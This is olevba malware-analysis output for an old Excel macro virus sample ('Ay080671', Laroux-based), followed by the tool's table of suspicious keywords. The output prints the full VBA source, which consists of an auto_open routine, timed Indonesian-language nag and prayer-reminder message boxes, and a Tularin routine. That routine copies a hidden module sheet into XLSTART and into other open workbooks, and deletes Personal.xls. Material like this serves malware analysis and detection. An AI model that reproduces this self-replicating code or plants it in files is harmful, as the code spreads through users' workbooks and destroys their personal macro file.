olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-aea54c7eb9878dca10db5b2a1bc6778ba8539339
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Ay080671.bas 
in file: Virus.MSExcel.Laroux-based-aea54c7eb9878dca10db5b2a1bc6778ba8539339 - OLE stream: '_VBA_PROJECT_CUR/VBA/Ay080671'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'
'Hai... I am Eight Of June !
'It's My Program ! Don't Erase or Change It !
'It's not danger, but help you when you have to save your data and when you have to PRAY !
'I hope you enjoy with my program. And I am Sorry, if my program disturb you !
'Created on December 01, 1997
'IAIN Syahid Jakarta ADAB Sastra Arab
'

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo Salah
    Fold$ = Application.DefaultFilePath
    Open Fold$ & "\Ay080671.Doc" For Output As #1
    Write #1, "Makasih anda telah membantu menyebarkan Virus Macro Saya. Tapi anda jangan kuatir, karena Virus saya tidak berbahaya kok. Bahkan mengingatkan anda, KAPAN anda harus Sholat, juga KAPAN anda harus menyimpan data anda. Saya harap Virus saya tidak mengganggu kerja anda ! - From : Ay080671"
    Close #1
    ChDir Application.StartupPath
    Umur = Year(Now()) - 1971
    If Day(Now()) = 8 And Month(Now()) = 6 Then MsgBox "Horeee ! Today Is My Birth Day. I am " & Umur & " years old !", 64, "June 08, 1971"
    Application.OnSheetActivate = "Tularin"
    Application.OnTime Now + TimeValue("00:01:00"), "Buka"
    Application.OnTime TimeValue("12:00:00"), "Zuhur"
    Application.OnTime TimeValue("13:00:00"), "Jam"
    Application.OnTime TimeValue("13:30:00"), "Jam"
    Application.OnTime TimeValue("14:00:00"), "Jam"
    Application.OnTime TimeValue("14:30:00"), "Jam"
    Application.OnTime TimeValue("15:30:00"), "Ashar"
    Application.OnTime TimeValue("16:00:00"), "Jam"
    Application.OnTime TimeValue("16:30:00"), "Jam"
    Application.OnTime TimeValue("17:00:00"), "Jam"
    Application.OnTime TimeValue("17:30:00"), "Jam"
    Application.OnTime TimeValue("18:00:00"), "Magrib"
    Application.OnTime TimeValue("18:30:00"), "Magrib"
    Application.OnTime TimeValue("19:00:00"), "Jam"
    Application.OnTime TimeValue("19:30:00"), "Isya"
    Application.OnTime TimeValue("20:00:00"), "Isya"
    Application.OnTime TimeValue("20:30:00"), "Jam"
    Application.OnTime TimeValue("21:00:00"), "Jam"
    Application.OnTime TimeValue("21:30:00"), "Jam"
    Application.OnTime TimeValue("22:00:00"), "Tidur"
    Application.OnTime TimeValue("22:30:00"), "Tidur"
    Application.OnTime TimeValue("23:00:00"), "Tidur"
    Application.OnTime TimeValue("23:30:00"), "Tidur"
    Application.OnTime TimeValue("23:59:30"), "Tidur"

Salah:
    If Err = 76 Then
    x$ = Application.StartupPath
    z = Len(x$)
    y = Val(z - 8)
    a$ = Left(Application.StartupPath, y)
    ChDir a$
    MkDir "Xlstart"
    Else
    End If
    ChDir Application.DefaultFilePath
    Resume Next
End Sub

Sub Buka()
Attribute Buka.VB_ProcData.VB_Invoke_Func = " \n14"
MsgBox "Perhatian ! Mohon Simpan Data Anda Sesering Mungkin !", 64, "June 08, 1971"
End Sub

Sub Jam()
Attribute Jam.VB_ProcData.VB_Invoke_Func = " \n14"
Umur = Year(Now()) - 1971
If Day(Now()) = 8 And Month(Now()) = 6 Then MsgBox "Horeee ! Today Is My Birth Day. I am " & Umur & " years old !", 64, "June 08, 1971"
MsgBox "Maaf Mengganggu Sebentar, Mohon Simpan Data Anda !", 64, "June 08, 1971"
End Sub

Sub Zuhur()
Attribute Zuhur.VB_ProcData.VB_Invoke_Func = " \n14"
Umur = Year(Now()) - 1971
If Day(Now()) = 8 And Month(Now()) = 6 Then MsgBox "Horeee ! Today Is My Birth Day. I am " & Umur & " years old !", 64, "June 08, 1971"
MsgBox "Saatnya Sholat Zuhur. Sholat Dulu Dong !", 64, "June 08, 1971"
End Sub

Sub Ashar()
Attribute Ashar.VB_ProcData.VB_Invoke_Func = " \n14"
Umur = Year(Now()) - 1971
If Day(Now()) = 8 And Month(Now()) = 6 Then MsgBox "Horeee ! Today Is My Birth Day. I am " & Umur & " years old !", 64, "June 08, 1971"
MsgBox "Udah Sholat Ashar Belum ? Kalo Belum, Sholat Dulu Dong !", 64, "June 08, 1971"
End Sub

Sub Magrib()
Attribute Magrib.VB_ProcData.VB_Invoke_Func = " \n14"
Umur = Year(Now()) - 1971
If Day(Now()) = 8 And Month(Now()) = 6 Then MsgBox "Horeee ! Today Is My Birth Day. I am " & Umur & " years old !", 64, "June 08, 1971"
MsgBox "Woi... Udah Maghrib. Sholat Dulu Dong !", 64, "June 08, 1971"
End Sub

Sub Isya()
Attribute Isya.VB_ProcData.VB_Invoke_Func = " \n14"
Umur = Year(Now()) - 1971
If Day(Now()) = 8 And Month(Now()) = 6 Then MsgBox "Horeee ! Today Is My Birth Day. I am " & Umur & " years old !", 64, "June 08, 1971"
MsgBox "Anda Sudah Sholat Isya ?", 64, "June 08, 1971"
End Sub

Sub Tidur()
Attribute Tidur.VB_ProcData.VB_Invoke_Func = " \n14"
Umur = Year(Now()) - 1971
If Day(Now()) = 8 And Month(Now()) = 6 Then MsgBox "Horeee ! Today Is My Birth Day. I am " & Umur & " years old !", 64, "June 08, 1971"
MsgBox "Sssttt... Udah Malam... Tidur Dong !", 64, "June 08, 1971"
End Sub

Sub Tularin()
Attribute Tularin.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo Terusin
    Application.ScreenUpdating = False
    Umur = Year(Now()) - 1971
    If Day(Now()) = 8 And Month(Now()) = 6 Then MsgBox "Horeee ! Today Is My Birth Day. I am " & Umur & " years old !", 64, "June 08, 1971"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "080671.xls")
    If m$ = "080671.xls" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    hapus$ = Dir(c$ & "\" & "Personal.xls")
    If hapus$ = "Personal.xls" Or hapus$ = "personal.xls" Or hapus$ = "PERSONAL.XLS" Then
        Windows("Personal.xls").Visible = True
        Windows("Personal.xls").Save
        Windows("Personal.xls").Close
        Kill c$ & "\" & hapus$
    Else
    End If

Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("Ay080671").Visible = True
    Sheets("Ay080671").Select
    Sheets("Ay080671").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "080671.xls", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("Ay080671").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "080671.xls!Tularin"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "Ay080671" Then
        Workbooks("080671.xls").Sheets("Ay080671").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("Ay080671").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "080671.xls!Tularin"
    Case Else
End Select

Terusin:
    If Err = 76 Then
    x$ = Application.StartupPath
    z = Len(x$)
    y = Val(z - 8)
    a$ = Left(Application.StartupPath, y)
    ChDir a$
    MkDir "Xlstart"
    Else
    End If
    ChDir Application.DefaultFilePath
    Resume Next
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Ay08067
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

